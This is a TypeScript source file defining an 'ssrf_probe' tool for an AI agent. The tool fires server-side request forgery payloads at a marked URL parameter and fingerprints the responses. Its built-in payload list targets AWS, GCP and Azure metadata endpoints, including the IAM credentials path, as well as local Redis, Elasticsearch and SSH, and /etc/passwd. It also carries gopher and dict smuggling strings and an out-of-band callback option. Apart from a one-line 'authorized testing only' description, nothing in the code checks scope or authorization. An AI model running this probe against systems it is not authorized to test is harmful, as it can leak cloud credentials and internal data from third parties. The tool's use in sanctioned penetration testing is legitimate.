import { Tool } from "./tool"
import z from "zod"

const DESCRIPTION =
  "Active SSRF probe: substitutes payloads into a marked URL parameter and observes responses for cloud metadata leaks, internal service exposure, and DNS interaction. Authorized testing only."

const PARAMETERS = z.object({
  url: z.string().describe("Target URL with FUZZ marker where payload is substituted (e.g., https://app/api?u=FUZZ)"),
  payloads: z.array(z.string()).optional().describe("Custom payloads (defaults to standard SSRF wordlist)"),
  method: z.enum(["GET", "POST"]).optional().describe("HTTP method (default GET)"),
  timeout: z.number().optional().describe("Per-request timeout ms (default 5000)"),
  collaborator: z.string().optional().describe("Out-of-band domain for DNS callback (e.g., burp collaborator)"),
})

const DEFAULT_PAYLOADS = [
  "http://169.254.169.254/latest/meta-data/",
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
  "http://localhost/",
  "http://127.0.0.1:22",
  "http://127.0.0.1:6379/info",
  "http://127.0.0.1:9200/_cat/indices",
  "http://127.0.0.1:5000/",
  "http://[::1]/",
  "http://0.0.0.0/",
  "file:///etc/passwd",
  "file:///c:/windows/win.ini",
  "gopher://127.0.0.1:6379/_INFO",
  "dict://127.0.0.1:11211/stat",
]

const FINGERPRINTS: Array<{ pattern: RegExp; service: string }> = [
  { pattern: /ami-id|instance-id|security-credentials/i, service: "AWS IMDS" },
  { pattern: /computeMetadata|google-compute/i, service: "GCP Metadata" },
  { pattern: /Microsoft-Azure|metadata\/instance/i, service: "Azure IMDS" },
  { pattern: /redis_version/i, service: "Redis" },
  { pattern: /elasticsearch|cluster_name/i, service: "Elasticsearch" },
  { pattern: /root:x:0:0/, service: "Linux /etc/passwd" },
  { pattern: /\[fonts\]|\[mail\]|\[extensions\]/, service: "Windows win.ini" },
  { pattern: /SSH-\d/, service: "SSH banner" },
]

export const SSRFProbeTool = Tool.define("ssrf_probe", {
  description: DESCRIPTION,
  parameters: PARAMETERS,
  async execute(params) {
    if (!params.url.includes("FUZZ")) throw new Error("URL must contain FUZZ marker")
    const method = params.method ?? "GET"
    const timeout = params.timeout ?? 5000
    let payloads = params.payloads?.length ? params.payloads : DEFAULT_PAYLOADS
    if (params.collaborator) payloads = [...payloads, `http://${params.collaborator}/ssrf-probe`]

    const findings: Array<{ payload: string; status: number | string; size: number; matches: string[] }> = []
    for (const pl of payloads) {
      const target = params.url.replace("FUZZ", encodeURIComponent(pl))
      const ctrl = new AbortController()
      const t = setTimeout(() => ctrl.abort(), timeout)
      try {
        const res = await fetch(target, { method, signal: ctrl.signal, redirect: "manual" })
        const body = await res.text().catch(() => "")
        const matches = FINGERPRINTS.filter((f) => f.pattern.test(body)).map((f) => f.service)
        findings.push({ payload: pl, status: res.status, size: body.length, matches })
      } catch (err: any) {
        findings.push({ payload: pl, status: err.name === "AbortError" ? "timeout" : "error", size: 0, matches: [] })
      } finally {
        clearTimeout(t)
      }
    }

    const hits = findings.filter((f) => f.matches.length > 0)
    let out = `## SSRF Probe Results\n\n**Target**: ${params.url}\n**Payloads**: ${payloads.length}\n**Hits**: ${hits.length}\n\n`
    if (hits.length) {
      out += "### Confirmed leaks\n\n| Payload | Status | Size | Service |\n|---------|--------|------|---------|\n"
      for (const h of hits) out += `| \`${h.payload}\` | ${h.status} | ${h.size} | ${h.matches.join(", ")} |\n`
    }
    out += "\n### All responses\n\n| Payload | Status | Size |\n|---------|--------|------|\n"
    for (const f of findings) out += `| \`${f.payload}\` | ${f.status} | ${f.size} |\n`

    return {
      title: "SSRF Probe",
      output: out,
      metadata: { action: "ssrf_probe", target: params.url, total: findings.length, hits: hits.length, findings },
    }
  },
})
